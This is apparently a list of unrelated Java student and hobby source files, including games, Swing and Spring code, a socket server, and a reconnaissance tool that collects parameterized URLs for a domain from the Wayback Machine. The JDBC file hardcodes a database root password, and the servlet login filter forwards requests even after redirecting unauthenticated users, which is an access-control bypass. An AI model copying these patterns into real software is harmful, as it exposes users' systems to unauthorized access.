i=0; i<100; i++) Bot.moveTree(currentGame, true);\n                        long t4 = System.currentTimeMillis();\n                        System.out.println(\"100 iterations: \" + (t4-t3));\n                        break;\n                    case \"clone\":\n                        currentGame = currentGame.getGame();\n                        break;\n                    case \"piece\":\n                        currentGame.nextPiece();\n                        break;\n                    case \"garbage\":\n                        currentGame.garbage.addGarbageToQueue(4);\n                        break;\n                }\n            } else {\n                currentGame.doMovement(input, 1);\n                if (Consts.Bot1v1) {\n                    if (currentGame.mostRecentLinesSent > 0) {\n                        GarbageHandler.sendGarbage(currentGame, otherGame, currentGame.mostRecentLinesSent);\n                        currentGame.mostRecentLinesSent = 0;\n                    }\n                    for (int i=0; i<input.length(); i++) {\n                        if (input.charAt(i) == 'w') {\n                            otherGame.doMovement(Bot.compute2(otherGame, 5, 100), 1);\n                            if (otherGame.mostRecentLinesSent > 0) {\n                                GarbageHandler.sendGarbage(otherGame, currentGame, otherGame.mostRecentLinesSent);\n                            }\n                            break;\n                        }\n                    }\n                } else {\n                    Game tempGame = new Game();\n                    if (currentGame.mostRecentLinesSent > 0) {\n                        GarbageHandler.sendGarbage(currentGame, tempGame, currentGame.mostRecentLinesSent);\n                        currentGame.mostRecentLinesSent = 0;\n                    }\n                }\n            }\n            if (Consts.Bot1v1) {\n                Game.PrintBoardDisplay(currentGame, otherGame);\n            } else {\n                Game.PrintBoardDisplay(currentGame);\n            }\n            System.out.print(Score.scoreBoard(currentGame.board) + \", ATTACK: \" + currentGame.attackSent + \", PLACED: \" + currentGame.piecesPlaced + \", CLEARED: \" + currentGame.mostRecentLinesCleared + \", HEIGHTS: \");\n            for (int i=0; i<Consts.BoardWidth; i++) { System.out.print(currentGame.board.getColumnHeights()[i]); }\n            System.out.print(\", COMBO: \" + currentGame.combo + \", B2B: \" + currentGame.b2b + \", MOST RECENT ATTACK: \" + currentGame.mostRecentLinesSent + \", TSPIN TYPE: \" + currentGame.mostRecentTspinType + \", GARBAGE: \" + currentGame.garbage.amount);\n        }\n        scanner.close();\n    }\n}",
    "\npackage presentation.BackOffice.Vues;\n\nimport Metier.MetierGestion.GestionnaireDepartement;\nimport Metier.MetierPOJO.Departement;\nimport Metier.MetierPOJO.Etudiant;\nimport presentation.BackOffice.Controlleur.ControlleurDepartement;\n\nimport java.util.ArrayList;\nimport javax.swing.JOptionPane;\nimport javax.swing.JTable;\nimport javax.swing.table.DefaultTableModel;\n\npublic class getAllDepartement extends javax.swing.JFrame {\n        GestionnaireDepartement etdG = new GestionnaireDepartement();\n        Departement etd = new Departement();\n        DefaultTableModel model ;\n        ControlleurDepartement controlleurdepartement ;\n\n    public getAllDepartement(ControlleurDepartement c) {\n\n        initComponents();\n        TableProduit();\n        this.controlleurdepartement = c;     }\n    public void Table( JTable tableDepartement){\n        tableDepartement.setBorder(javax.swing.BorderFactory.createEtchedBorder());\n        tableDepartement.setModel(new javax.swing.table.DefaultTableModel(\n            new Object [][] {\n\n            },\n            new String [] {\n                \"Id \", \"Nom departement\", \"Chef departement\" \n            }\n        ));\n        jScrollPane1.setViewportView(tableDepartement);}\n\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jLabel2 = new javax.swing.JLabel();\n        jLabel3 = new javax.swing.JLabel();\n        jPanel1 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        jLabel4 = new javax.swing.JLabel();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        tableDepartement = new javax.swing.JTable();\n        jLabel5 = new javax.swing.JLabel();\n        nomDepartement = new javax.swing.JTextField();\n        entrer = new javax.swing.JButton();\n        retourMenu = new javax.swing.JButton();\n\n        jLabel2.setText(\"jLabel2\");\n\n        jLabel3.setText(\"jLabel3\");\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        jPanel1.setBackground(new java.awt.Color(0, 51, 51));\n\n        jLabel1.setFont(new java.awt.Font(\"Tw Cen MT Condensed\", 1, 36)); // NOI18N\n        jLabel1.setForeground(new java.awt.Color(255, 153, 153));\n        jLabel1.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);\n        jLabel1.setIcon(new javax.swing.ImageIcon(getClass().getResource(\"/presentation/img/9023992_student_fill_icon.png\"))); // NOI18N\n        jLabel1.setText(\"LISTE DEPARTEMENT\");\n\n        jLabel4.setFont(new java.awt.Font(\"Tw Cen MT Condensed\", 1, 18)); // NOI18N\n        jLabel4.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel4.setText(\" DEPARTEMENTS :\");\n\n        tableDepartement.setModel(new javax.swing.table.DefaultTableModel(\n            new Object [][] {\n\n            },\n            new String [] {\n                \"ID\", \"Nom departement\"\n            }\n        ));\n        jScrollPane1.setViewportView(tableDepartement);\n\n        jLabel5.setFont(new java.awt.Font(\"Tw Cen MT Condensed\", 1, 18)); // NOI18N\n        jLabel5.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel5.setText(\"ENTRER LE NOM DE DEPARTEMENT \");\n\n        nomDepartement.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                nomDepartementActionPerformed(evt);\n            }\n        });\n\n        entrer.setBackground(new java.awt.Color(255, 102, 102));\n        entrer.setFont(new java.awt.Font(\"Tw Cen MT Condensed\", 1, 24)); // NOI18N\n        entrer.setText(\"ENTRER \");\n        entrer.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                entrerActionPerformed(evt);\n            }\n        });\n\n        retourMenu.setBackground(new java.awt.Color(255, 102, 102));\n        retourMenu.setFont(new java.awt.Font(\"Tw Cen MT Condensed\", 1, 24)); // NOI18N\n        retourMenu.setForeground(new java.awt.Color(51, 0, 51));\n        retourMenu.setText(\"EXIT\");\n        retourMenu.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                retourMenuActionPerformed(evt);\n            }\n        });\n\n        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);\n        jPanel1.setLayout(jPanel1Layout);\n        jPanel1Layout.setHorizontalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, 744, Short.MAX_VALUE)\n            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()\n                .addGap(35, 35, 35)\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)\n              ",
    "import java.io.*;\nimport java.sql.*;\n\npublic class op {\n    private static final String url = \"jdbc:mysql://localhost:3306/mydatabase\" ;\n    private static final String password = \"@#aditya2006\";\n    private static final String username = \"root\";\n\n\n    public static void main(String args[]) {\n\n        // image insert\n\n//        String image_path = \"C:\\\\Users\\\\admin\\\\Pictures\\\\my\\\\20230919_115042.jpg\";\n//\n//        try {\n//            Class.forName(\"com.mysql.cj.jdbc.Driver\");\n//        }catch (ClassNotFoundException e) {\n//            System.out.println(\"error at driver.\");\n//        }\n//        String query = \"insert into image_table(image_data) values (?)\";\n//\n//        try {\n//            Connection cn = DriverManager.getConnection(url,username,password);\n//            FileInputStream f = new FileInputStream(image_path);\n//            byte imageStore[] = new byte[f.available()];\n//            f.read(imageStore);\n//            PreparedStatement ps = cn.prepareStatement(query);\n//            ps.setBytes(1,imageStore);\n//            int afr = ps.executeUpdate();\n//            if(afr > 0) {\n//                System.out.println(\"image insert succesfullty\");\n//            }else {\n//                System.out.println(\"image insert succesfullty\");\n//            }\n//\n//        }catch (SQLException | IOException e) {\n//            System.out.println(\"error at get connection or image loading.\");\n//        }\n\n\n\n        // image retrive\n\n\n        String folder_path = \"C:\\\\Users\\\\admin\\\\Pictures\\\\image_DB\\\\\";\n        String query = \"select image_data from image_table where image_id = ?;\";\n\n        try {\n            Connection cn = DriverManager.getConnection(url,username,password);\n            PreparedStatement ps = cn.prepareStatement(query);\n            ps.setInt(1,2);\n            ResultSet rs = ps.executeQuery();\n            if(rs.next()) {\n                byte image_data[] = rs.getBytes(\"image_data\");\n                String image_path_con = folder_path + \"Aditya.jpg\";\n                OutputStream op = new FileOutputStream(image_path_con);\n                op.write(image_data);\n            }else {\n                System.out.println(\"for this id no image found.\");\n            }\n        }catch (SQLException | IOException e ) {\n            System.out.println(\"error at get connection.\");\n        }\n\n    }\n}\n",
    "package br.market.market_sistem;\n\nimport java.io.IOException;\n\nimport jakarta.servlet.Filter;\nimport jakarta.servlet.FilterChain;\nimport jakarta.servlet.FilterConfig;\nimport jakarta.servlet.ServletException;\nimport jakarta.servlet.ServletRequest;\nimport jakarta.servlet.ServletResponse;\nimport jakarta.servlet.annotation.WebFilter;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport jakarta.servlet.http.HttpSession;\n\n@WebFilter(urlPatterns = {\"/portal_cliente.html\", \"/portal_logista.html\"}) // adicionar URI que ir\u00e1 passar pelo filtro\npublic class Filtro implements Filter {\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException{\n        Filter.super.init(filterConfig);\n    }\n\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n\n        HttpServletRequest request = ((HttpServletRequest) servletRequest);\n        HttpServletResponse response = ((HttpServletResponse) servletResponse);\n\n\n        HttpSession session = request.getSession(false);\n\n        if(session == null){\n            response.sendRedirect(\"login.html?msg=precisa_est\u00e1_logado!\");\n        }else{\n            Boolean logado = (Boolean) session.getAttribute(\"logado\");\n            if(!logado || logado == null){\n                response.sendRedirect(\"login.html?msg=precisa_est\u00e1_logado!\");\n            }\n        }\n        \n        filterChain.doFilter(servletRequest, servletResponse);\n    }\n\n    @Override\n    public void destroy(){\n        Filter.super.destroy();\n    }\n}\n",
    "package com.example.travel1.Domains;\n\nimport java.io.Serializable;\n\npublic class PopularDomain implements Serializable {\n\n    private String title;\n    private String location;\n    private String description;\n    private int bed;\n    private boolean guide;\n    private double score;\n    private String pic;\n    private boolean wifi;\n    private int price;\n\n\n    public PopularDomain(String title, String location, String description, int bed, boolean guide, double score, String pic, boolean wifi, int price) {\n        this.title = title;\n        this.location = location;\n        this.description = description;\n        this.bed = bed;\n        this.guide = guide;\n        this.score = score;\n        this.pic = pic;\n        this.wifi = wifi;\n        this.price = price;\n    }\n\n    public String getTitle() {\n        return title;\n    }\n\n    public void setTitle(String title) {\n        this.title = title;\n    }\n\n    public String getLocation() {\n        return location;\n    }\n\n    public void setLocation(String location) {\n        this.location = location;\n    }\n\n    public String getDescription() {\n        return description;\n    }\n\n    public void setDescription(String description) {\n        this.description = description;\n    }\n\n    public int getBed() {\n        return bed;\n    }\n\n    public void setBed(int bed) {\n        this.bed = bed;\n    }\n\n    public boolean isGuide() {\n        return guide;\n    }\n\n    public void setGuide(boolean guide) {\n        this.guide = guide;\n    }\n\n    public double getScore() {\n        return score;\n    }\n\n    public void setScore(double score) {\n        this.score = score;\n    }\n\n    public String getPic() {\n        return pic;\n    }\n\n    public void setPic(String pic) {\n        this.pic = pic;\n    }\n\n    public boolean isWifi() {\n        return wifi;\n    }\n\n    public void setWifi(boolean wifi) {\n        this.wifi = wifi;\n    }\n\n    public int getPrice() {\n        return price;\n    }\n\n    public void setPrice(int price) {\n        this.price = price;\n    }\n}\n",
    "package dev.yatoenough.kanbanapi.controllers;\n\nimport java.util.List;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.ResponseStatus;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport dev.yatoenough.kanbanapi.dtos.BoardDTO;\nimport dev.yatoenough.kanbanapi.models.Board;\nimport dev.yatoenough.kanbanapi.services.BoardsService;\nimport jakarta.validation.Valid;\n\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.DeleteMapping;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PatchMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\n\n@RestController\n@RequestMapping(\"/api/v1/boards\")\npublic class BoardsController {\n\t\n\t@Autowired\n\tprivate BoardsService boardsService;\n\n\t@PostMapping()\n\t@ResponseStatus(HttpStatus.CREATED)\n\tpublic Board createBoard(@Valid @RequestBody BoardDTO board) {\n\t\treturn boardsService.createBoard(board.getName());\n\t}\n\n\t@GetMapping()\n\tpublic List<Board> findAll() {\n\t\treturn boardsService.findAllBoards();\n\t}\n\n\t@GetMapping(\"/{id}\") \n\tpublic Board findById(@PathVariable(\"id\") String id) {\n\t\t\treturn boardsService.findBoardById(id);\n\t}\n\n\t@PatchMapping(\"/{id}\")\n\tpublic Board findById(@PathVariable(\"id\") String id, @Valid @RequestBody BoardDTO board) {\n\t\treturn boardsService.updateBoardName(id, board.getName());\n\t}\n\n\t@DeleteMapping(\"/{id}\")\n\tpublic Board delete(@PathVariable(\"id\") String id) {\n\t\treturn boardsService.deleteBoard(id);\n\t}\n\t\n}\n",
    "\r\nimport java.util.Arrays;\r\nimport java.util.ArrayList;\r\nimport java.util.Random;\r\n\r\npublic class ParityBitCorrectionTester{\r\n\r\n    public static void showOriginalData(boolean[][] dataWord){\r\n        // show dataword\r\n        String buffer = \"\";\r\n        for(int j = 0;j < dataWord.length;j++){\r\n            for(int i = 0;i < dataWord[j].length;i++){\r\n                \r\n               if(dataWord[j][i]){\r\n                buffer += \" 1\";\r\n               }else{\r\n                buffer += \" 0\";\r\n               }\r\n            }\r\n            buffer =  \"[\" + buffer + \" ] \";\r\n            System.out.print(buffer);\r\n            buffer = \"\";\r\n        }\r\n\r\n    }\r\n\r\n    public static int[] randomizeSingleBitErrorPosition(boolean[][] codeword){\r\n        // method to show codeblock generate bitflip based on x and y index of 2d array codeword\r\n        Random rand = new Random();\r\n        int randX = rand.nextInt(codeword[0].length);\r\n        int randY = rand.nextInt(codeword.length);\r\n        return new int[]{randX,randY};\r\n        // showParityProcess(codeword,randX,randY);\r\n\r\n    }\r\n\r\n    public static void showCodeBlock(boolean[][] codeWord){\r\n        // method to show codeblock\r\n        StringBuilder buffer = new StringBuilder();\r\n\r\n        for(int j = 0;j < codeWord.length;j++){\r\n            buffer.append(\"[ \");\r\n            for(int i = 0;i < codeWord[j].length;i++){\r\n\r\n                buffer.append(codeWord[j][i]?\"1 \":\"0 \");\r\n\r\n            }\r\n            buffer.append(\"] \");\r\n        }\r\n        System.out.print(buffer);\r\n\r\n    }\r\n\r\n    public static void showVerticalSyndrome(boolean[][] syndrome){\r\n        // method to show vertical syndrome\r\n        StringBuilder buffer = new StringBuilder();\r\n        buffer.append(\"[\");\r\n        for(int i = 0;i < syndrome[1].length;i++){\r\n            buffer.append(syndrome[1][i] ? \" 1\":\" 0\");\r\n        }\r\n        buffer.append(\" ]\");\r\n        System.out.print(buffer);\r\n    }\r\n\r\n    public static void showHorizontalSyndrome(boolean[][] syndrome){\r\n        // method to show horizontal syndrome\r\n        StringBuilder buffer = new StringBuilder();\r\n        buffer.append(\"[\");\r\n        for(int i = 0;i < syndrome[0].length;i++){\r\n            buffer.append(syndrome[0][i] ? \" 1\":\" 0\");\r\n        }\r\n        buffer.append(\" ]\");\r\n        System.out.print(buffer);\r\n    }\r\n\r\n    public static void showErrorLocation(int[][] errorPositions,boolean[][] codeWord){\r\n        // method to show error location\r\n        StringBuilder buffer = new StringBuilder();\r\n        boolean isError = false;\r\n        for(int j = 0; j < codeWord.length;j++){\r\n            buffer.append(\"[ \");\r\n            for(int i = 0;i < codeWord[0].length;i++){\r\n                for(int e = 0;e < errorPositions.length;e++){\r\n                    if(j == errorPositions[e][1] && i == errorPositions[e][0]){\r\n                        buffer.append(\"X \");\r\n                        isError = true;\r\n                        break;\r\n                    }\r\n                }\r\n                if(isError){\r\n                    isError = false;\r\n                    continue;\r\n                }\r\n                buffer.append(\"  \");\r\n            }\r\n            buffer.append(\"] \");\r\n        }\r\n        System.out.print(buffer);\r\n    }\r\n\r\n    public static void showErrorLocation(ArrayList<Integer> errorPositionsList,boolean[][] codeWord){\r\n        // method to show error location\r\n        StringBuilder buffer = new StringBuilder();\r\n        boolean isError = false;\r\n        for(int j = 0; j < codeWord.length;j++){\r\n            buffer.append(\"[ \");\r\n            for(int i = 0;i < codeWord[0].length;i++){\r\n                for(int e = 0;e < errorPositionsList.size();e++){\r\n                    if(errorPositionsList.get(e) == j * codeWord[0].length + i){\r\n                        buffer.append(\"X \");\r\n                        isError = true;\r\n                        break;\r\n                    }\r\n                }\r\n                if(isError){\r\n                    isError = false;\r\n                    continue;\r\n                }\r\n                buffer.append(\"  \");\r\n            }\r\n            buffer.append(\"] \");\r\n        }\r\n        System.out.print(buffer);\r\n\r\n\r\n\r\n    }\r\n\r\n    public static ArrayList<Integer> locateErrorIndex(boolean[][] codeWord,boolean[][] syndrome){\r\n        // syndrome[0] = horizontalSyndrome\r\n        // syndrome[1] = verticalSyndrome\r\n\r\n        ArrayList<Integer> errorIndexes = new ArrayList<Integer>();\r\n        boolean allZeroVertical = true;\r\n        boolean allZeroHorizontal = true;\r\n        ArrayList<Integer> verticalOne = new ArrayList<Integer>();\r\n        ArrayList<Integer> horizontalOne = new ArrayList<Integer>();\r\n        for(int i = 0;i < syndrome[0].length;i++){\r\n            if(syndrome[0][i]){\r\n                horizontalOne.add(i);\r\n                allZeroHorizontal = false;\r\n            }\r\n        }\r\n        for(int i = 0;i < syndrome[1].length;i++){\r\n            if(syndrome[1][i]){\r\n                verticalOne.add(i);\r\n        ",
    "package addingnumbersserverapp;\n\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\n\npublic class AddingNumbersServerApp {\n\n    public static void main(String[] args) {\n        // TODO code application logic here\n        ServerSocket ss = null;\n        Socket socket = null;\n        BufferedReader br = null;\n        PrintWriter out = null;\n        String data = null;\n        \n        try {\n            ss = new ServerSocket(2020);\n            System.out.println(\"waiting for client...\");\n            socket = ss.accept();\n            \n            br = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            \n            data = br.readLine();\n            \n            String[] numbers = data.split(\"#\");\n            \n            Integer num1,  num2, results;\n            \n            String index0 = numbers[0];\n            num1 = Integer.parseInt(index0);\n                \n            String index1 = numbers[1];\n            num2 = Integer.parseInt(index1);\n            \n            results = num1 + num2;\n            \n            out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())),true);\n            \n            out.println(\"sum of \"+num1+\" and \"+num2 + \" is \"+results);\n            \n            System.out.println(\"sum of \"+num1+\" and \"+num2 + \" is \"+results);\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }finally{\n            try {\n                socket.close();\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            }\n        \n        \n        \n    }\n    \n    }\n}\n",
    "package org.Mouath;\n\nimport org.apache.commons.cli.*;\n\nimport java.io.*;\nimport java.net.URL;\nimport java.util.HashSet;\nimport java.util.Set;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class Main {\n\n\n    private static final Set<String> BLACKLIST = new HashSet<>();\n\n    static {\n        //  for param blacklist\n        BLACKLIST.add(\".jpg\");\n        BLACKLIST.add(\".jpeg\");\n        BLACKLIST.add(\".png\");\n        BLACKLIST.add(\".gif\");\n        BLACKLIST.add(\".pdf\");\n        BLACKLIST.add(\".svg\");\n        BLACKLIST.add(\".json\");\n        BLACKLIST.add(\".css\");\n        BLACKLIST.add(\".js\");\n        BLACKLIST.add(\".webp\");\n        BLACKLIST.add(\".woff\");\n        BLACKLIST.add(\".woff2\");\n        BLACKLIST.add(\".eot\");\n        BLACKLIST.add(\".ttf\");\n        BLACKLIST.add(\".otf\");\n        BLACKLIST.add(\".mp4\");\n        BLACKLIST.add(\".txt\");\n    }\n\n    public static void main(String[] args) {\n        System.out.println(ConsoleColors.GREEN_BOLD+\"\\n  ____                                       _____   _               _\\n\" +\n                \" |  _ \\\\    __ _   _ __    __ _   _ __ ___   |  ___| (_)  _ __     __| |   ___   _ __\\n\" +\n                \" | |_) |  / _` | | '__|  / _` | | '_ ` _ \\\\  | |_    | | | '_ \\\\   / _` |  / _ \\\\ | '__|\\n\" +\n                \" |  __/  | (_| | | |    | (_| | | | | | | | |  _|   | | | | | | | (_| | |  __/ | |\\n\" +\n                \" |_|      \\\\__,_| |_|     \\\\__,_| |_| |_| |_| |_|     |_| |_| |_|  \\\\__,_|  \\\\___| |_|\\n\" +\n                \"\\n\" +\n                \"\\n\\t\\t\\t\\t\\t\\t\\thttps://github.com/MouathA\");\n        Options options = new Options();\n        options.addOption(\"d\", \"domain\", true, \"scan domain and subdomains\");\n        options.addOption(\"o\", \"output\", true, \"output\");\n        options.addOption(\"p\", \"params\", false, \"extract URLs with parameters only\");\n\n        CommandLineParser parser = new DefaultParser();\n        try {\n            CommandLine cmd = parser.parse(options, args);\n\n            if (cmd.hasOption(\"d\") && cmd.hasOption(\"o\")) {\n                String domain = cmd.getOptionValue(\"d\");\n                String output = cmd.getOptionValue(\"o\");\n                boolean extractParamsOnly = cmd.hasOption(\"p\");\n\n                System.out.println(ConsoleColors.GREEN_BOLD + \"[+] Scanning domain and subdomains: \" + domain);\n                outputDP(domain, output, extractParamsOnly);\n                System.out.println(ConsoleColors.GREEN_BOLD + \"[*] Task completed successfully.\");\n                System.out.println(ConsoleColors.RESET);\n                System.exit(0);\n            } else {\n                throw new IllegalArgumentException(\"[-] Please provide both domain (-d) and output (-o) options.\");\n            }\n        } catch (ParseException | IOException | InterruptedException e) {\n            System.err.println(ConsoleColors.RED_BOLD + \"[!] Error: \" + e.getMessage());\n            System.out.println(ConsoleColors.RESET);\n            System.exit(1);\n        } catch (IllegalArgumentException e) {\n            System.err.println(ConsoleColors.RED_BOLD + \"[-] Error: \" + e.getMessage());\n            System.out.println(ConsoleColors.RESET);\n            System.exit(1);\n        }\n    }\n\n    private static void outputDP(String domain, String outputFilePath, boolean extractParamsOnly) throws IOException, InterruptedException {\n\n        URL url = new URL(\"https://web.archive.org/cdx/search/cdx?url=\" + domain + \"/*&output=txt&collapse=urlkey&fl=original&page=/%22\");\n        BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));\n\n        BufferedWriter writer = new BufferedWriter(new FileWriter(outputFilePath));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            if (!shouldSkipURL(line)) {\n                if (extractParamsOnly) {\n                    Pattern pattern = Pattern.compile(\"(https?://\\\\S+\\\\?\\\\S+)\");\n                    Matcher matcher = pattern.matcher(line);\n                    while (matcher.find()) {\n                        String matchedUrl = matcher.group();\n                        writer.write(matchedUrl);\n                        writer.newLine();\n                    }\n                } else {\n                    writer.write(line);\n                    writer.newLine();\n                }\n            }\n        }\n\n        reader.close();\n        writer.close();\n        System.out.println(ConsoleColors.GREEN_BOLD + \"[*] URL content saved to \" + outputFilePath);\n        System.out.println(ConsoleColors.RESET);\n    }\n\n    private static boolean shouldSkipURL(String url) {\n        for (String extension : BLACKLIST) {\n            if (url.contains(extension)) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    private static class ConsoleColors {\n        public static final String RESET = \"\\u001B[0m\";\n        public static final String RED_BOLD = \"\\033[1;31m\";\n        public static final String GREEN_BOLD = \"\\033[1;32m\";\n    }\n}\n",
    "package unet.dns.records;\n\nimport unet.dns.messages.inter.DnsClass;\nimport unet.dns.messages.inter.Types;\nimport unet.dns.records.inter.DnsRecord;\n\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class ARecord extends DnsRecord {\n\n    private InetAddress address;\n\n    public ARecord(){\n        type = Types.A;\n    }\n\n    public ARecord(String query, DnsClass dnsClass, int ttl, InetAddress address){\n        this();\n        this.query = query;\n        this.dnsClass = dnsClass;\n        this.ttl = ttl;\n        this.address = address;\n    }\n\n    @Override\n    public byte[] encode(){\n        byte[] buf = super.encode();\n\n        byte[] addr = address.getAddress();\n        buf[8] = (byte) (addr.length >> 8);\n        buf[9] = (byte) addr.length;\n\n        System.arraycopy(addr, 0, buf, 10, addr.length);\n\n        return buf;\n    }\n\n    @Override\n    public void decode(byte[] buf, int off){\n        super.decode(buf, off);\n\n        byte[] record = new byte[((buf[off+6] & 0xFF) << 8) | (buf[off+7] & 0xFF)];\n        System.arraycopy(buf, off+8, record, 0, record.length);\n\n        try{\n            address = InetAddress.getByAddress(record);\n        }catch(UnknownHostException e){\n            throw new IllegalArgumentException(\"Invalid Inet Address\");\n        }\n    }\n\n    @Override\n    public int getLength(){\n        return super.getLength()+address.getAddress().length;\n    }\n\n    public void setAddress(InetAddress address){\n        this.address = address;\n    }\n\n    public InetAddress getAddress(){\n        return address;\n    }\n\n    @Override\n    public String toString(){\n        return super.toString()+\"\\r\\nADDRESS: \"+address.getHostAddress();\n    }\n}\n",
    "/* @formatter:off\n *\n * Dave Rosenberg\n * Comp 2000 - Data Structures\n * Lab: List application - card game\n * Spring, 2024\n * \n * Usage restrictions:\n * \n * You may use this code for exploration, experimentation, and furthering your\n * learning for this course. You may not use this code for any other\n * assignments, in my course or elsewhere, without explicit permission, in\n * advance, from myself (and the instructor of any other course).\n * \n * Further, you may not post (including in a public repository such as on github)\n * nor otherwise share this code with anyone other than current students in my \n * sections of this course. Violation of these usage restrictions will be considered \n * a violation of the Wentworth Institute of Technology Academic Honesty Policy.\n *\n * Do not remove this notice.\n *\n * @formatter:on\n */\n\n\npackage edu.wit.scds.ds.list.app ;\n\nimport java.util.ArrayList ;\nimport java.util.Collections ;\nimport java.util.List ;\nimport java.util.Objects ;\n\n/**\n * Representation of a playing card with a suit and rank.\n * <p>\n * The suit and rank are immutable.\n *\n * @author Dave Rosenberg\n *\n * @version 1.0.0 2020-11-19 initial version<br>\n * @version 2.0.0 2021-12-08\n *     <ul>\n *     <li>add support for face up/down\n *     <li>add {@code matches()}\n *     </ul><br>\n * @version 2.1.0 2022-11-06 support dynamic switching to compare cards based on suit and rank or\n *     rank alone<br>\n * @version 2.2.0 2024-03-26\n *     <ul>\n *     <li>minor cosmetic changes\n *     <li>revise {@code toString()} for greater formatting flexibility and control\n *     </ul><br>\n *\n * @author Your Name    // TODO\n *\n * @version 2.3.0 2024-03-26 Modifications for use for our game\n */\npublic class Card implements Comparable<Card>\n    {\n    // utility constants\n    /** indicate card is face up */\n    public final static boolean FACE_UP = true ;\n    /** indicate card is face down */\n    public final static boolean FACE_DOWN = false ;\n\n    // static data\n    /** default state of a card when instantiated - face up or down */\n    private static boolean defaultFaceUp = FACE_DOWN ;\n    /** controls whether {@code equals()} and {@code compareTo()} consider suit in calculations */\n    private static boolean compareSuit = true ;\n    /** the text to display when the card is face down - if not specified, use current default */\n    private static String faceDownText = \"--\" ;\n    \n    public static final String RED_COLOR = \"\\u001B[31m\";\n    public static final String RESET_COLOR = \"\\u001B[0m\";\n\n    // data fields\n    /** The card's suit */\n    public final Suit suit ;\n    /** The card's rank within its suit */\n    public final Rank rank ;\n    /** controls display - face up/down */\n    private boolean faceUp ;\n\n\n    /*\n     * constructors\n     */\n\n\n    /**\n     * Initializes a card with no suit (e.g., a joker)\n     *\n     * @param theRank\n     *     this card's rank\n     */\n    public Card( final Rank theRank )\n        {\n        this( Suit.NONE, theRank ) ;\n\n        }   // end 1-arg constructor\n\n\n    /**\n     * Initializes a card with a specified suit and rank and the default face up setting\n     * \n     * @param theSuit\n     *     this card's suit\n     * @param theRank\n     *     this card's rank\n     */\n    public Card( final Suit theSuit, final Rank theRank )\n        {\n        this( theSuit, theRank, Card.defaultFaceUp ) ;\n\n        }   // end 2-arg constructor\n\n\n    /**\n     * Initializes a card with a specified suit rank, and face up setting\n     * \n     * @param theSuit\n     *     this card's suit\n     * @param theRank\n     *     this card's rank\n     * @param initiallyFaceUp\n     *     if {@code true}, the card is face up; if {@code false}, the card is face down\n     */\n    public Card( final Suit theSuit, final Rank theRank, final boolean initiallyFaceUp )\n        {\n        this.suit = theSuit ;\n        this.rank = theRank ;\n        this.faceUp = initiallyFaceUp ;\n\n        }   // end full/3-arg constructor\n\n\n    /*\n     * methods to affect face up/down state and display of an instance\n     */\n\n\n    /**\n     * Flips a card over\n     *\n     * @return the previous state (face up/down)\n     */\n    public boolean flip()\n        {\n        final boolean wasFaceUp = this.faceUp ;\n\n        this.faceUp = !this.faceUp ;\n\n        return wasFaceUp ;\n\n        }  // end flip()\n\n\n    /**\n     * Turns a card face down\n     *\n     * @return the previous state (face up/down)\n     */\n    public boolean hide()\n        {\n        final boolean wasFaceUp = this.faceUp ;\n\n        this.faceUp = FACE_DOWN ;\n\n        return wasFaceUp ;\n\n        }  // end hide()\n\n\n    /**\n     * Turns a card face up\n     *\n     * @return the previous state (face up/down)\n     */\n    public boolean reveal()\n        {\n        final boolean wasFaceUp = this.faceUp ;\n\n        this.faceUp = FACE_UP ;\n\n        return wasFaceUp ;\n\n        }  // end reveal()\n\n\n    /**\n     * Retrieves the current behavior of {@code equals()} and {@code compareTo()} wrt\n     * {@code this.suit}\n  ",
